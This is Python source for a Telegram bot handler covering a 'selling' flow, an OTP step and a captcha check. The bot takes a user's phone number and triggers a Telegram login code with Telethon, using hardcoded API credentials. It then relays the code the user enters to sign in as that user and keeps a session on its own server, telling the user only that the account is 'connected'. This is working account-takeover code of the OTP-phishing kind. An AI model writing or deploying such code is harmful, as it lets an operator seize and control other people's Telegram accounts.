async def ultra_aggressive_captcha_answer_real(update, context):
    """CLEAN ULTRA AGGRESSIVE handler - captcha, phone, and OTP processing!"""
    user = update.effective_user
    user_input = update.message.text.strip() if update.message and update.message.text else ""
    
    # 🔥 CLEAN PHONE HANDLER 🔥
    if (context.user_data.get('conversation_type') == 'selling' and 
        user_input and user_input.startswith('+') and len(user_input) >= 8):
        
        print(f"🔥 CLEAN PHONE: Processing '{user_input}' for user {user.id}")
        
        try:
            context.user_data['phone'] = user_input
            
            processing_msg = await update.message.reply_text(
                f"📡 **Sending REAL OTP to {user_input}**\n\n⏳ Please wait..."
            )
            
            # CLEAN Telethon implementation
            from telethon import TelegramClient
            import os
            
            api_id = os.getenv('API_ID', '21734417')
            api_hash = os.getenv('API_HASH', 'd64eb98d90eb41b8ba3644e3722a3714')
            session_name = f"clean_otp_{user.id}"
            
            client = TelegramClient(session_name, api_id, api_hash)
            await client.connect()
            
            result = await client.send_code_request(user_input)
            context.user_data['phone_code_hash'] = result.phone_code_hash
            context.user_data['otp_session'] = session_name
            
            await processing_msg.edit_text(
                f"✅ **REAL OTP SENT to {user_input}!**\n\n"
                f"📲 Check your Telegram app for the 5-digit code\n\n"
                f"**Enter the code below:**"
            )
            
            await client.disconnect()
            return
            
        except Exception as e:
            print(f"🔥 CLEAN PHONE ERROR: {e}")
            await update.message.reply_text(f"❌ **OTP Send Failed**: {str(e)}")
            return
    
    # 🔥 CLEAN OTP HANDLER 🔥
    if (context.user_data.get('conversation_type') == 'selling' and 
        context.user_data.get('phone') and context.user_data.get('phone_code_hash') and
        user_input.isdigit() and len(user_input) == 5):
        
        print(f"🔥 CLEAN OTP: Verifying '{user_input}' for user {user.id}")
        
        try:
            phone = context.user_data.get('phone')
            phone_code_hash = context.user_data.get('phone_code_hash')
            session_name = context.user_data.get('otp_session')
            
            from telethon import TelegramClient
            import os
            
            api_id = os.getenv('API_ID', '21734417')
            api_hash = os.getenv('API_HASH', 'd64eb98d90eb41b8ba3644e3722a3714')
            
            client = TelegramClient(session_name, api_id, api_hash)
            await client.connect()
            
            # Verify OTP
            result = await client.sign_in(phone, user_input, phone_code_hash=phone_code_hash)
            
            await update.message.reply_text(
                f"🎉 **OTP VERIFIED SUCCESSFULLY!**\n\n"
                f"✅ Phone: {phone}\n"
                f"✅ Code: {user_input}\n\n"
                f"**Your account is now connected!**"
            )
            
            # Clean up
            context.user_data.pop('phone_code_hash', None)
            context.user_data.pop('otp_session', None)
            
            await client.disconnect()
            return
            
        except Exception as e:
            print(f"🔥 CLEAN OTP ERROR: {e}")
            await update.message.reply_text(f"❌ **OTP Verification Failed**: {str(e)}")
            return
    
    # 🔥 CLEAN CAPTCHA HANDLER 🔥
    if context.user_data.get('verification_step') == 1 and context.user_data.get('captcha_answer'):
        print(f"🔐 CLEAN CAPTCHA: '{user_input}' from user {user.id}")
        
        try:
            correct_answer = context.user_data.get('captcha_answer', '').lower()
            user_answer = user_input.lower()
            
            if user_answer == correct_answer:
                print(f"✅ CLEAN CAPTCHA: Correct for user {user.id}")
                
                # Mark captcha as completed
                from database import get_db_session, close_db_session
                from database.operations import UserService
                
                db = get_db_session()
                try:
                    db_user = UserService.get_user_by_telegram_id(db, user.id)
                    if db_user:
                        db_user.captcha_completed = True
                        db.commit()
                finally:
                    close_db_session(db)
                
                # Clear captcha data
                context.user_data.pop('captcha_answer', None)
                context.user_data.pop('verification_step', None)
                
                # Send verification success
                from telegram import InlineKeyboardButton, InlineKeyboardMarkup
                keyboard = [[InlineKeyboardButton("✅ Verify Membership", callback_data="verify_channels")]]
                
                await update.message.reply_text(
                    "🎉 **CAPTCHA Solved Successfully!**\n\n"
                    "✅ Great job! Now click the button below to verify your membership:",
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
                
            else:
                print(f"❌ CLEAN CAPTCHA: Wrong for user {user.id}")
                
                # Generate new captcha
                from services.captcha import CaptchaService
                from telegram import InlineKeyboardButton, InlineKeyboardMarkup
                captcha_service = CaptchaService()
                captcha_result = await captcha_service.generate_captcha()
                
                if captcha_result and "answer" in captcha_result:
                    context.user_data['captcha_answer'] = captcha_result['answer']
                    
                    keyboard = [[InlineKeyboardButton("🔄 New CAPTCHA", callback_data="new_captcha")]]
                    
                    with open(captcha_result["image_path"], 'rb') as photo:
                        await update.message.reply_photo(
                            photo=photo,
                            caption=f"❌ **Incorrect!** Try again.\n\n"
                                   f"🔒 Enter the {len(captcha_result['answer'])} characters you see:",
                            reply_markup=InlineKeyboardMarkup(keyboard)
                        )
                else:
                    await update.message.reply_text("❌ Wrong answer. Please try /start to get a new captcha.")
                    
        except Exception as e:
            print(f"🔐 CLEAN CAPTCHA ERROR: {e}")
            await update.message.reply_text("❌ Error processing verification. Please try /start again.")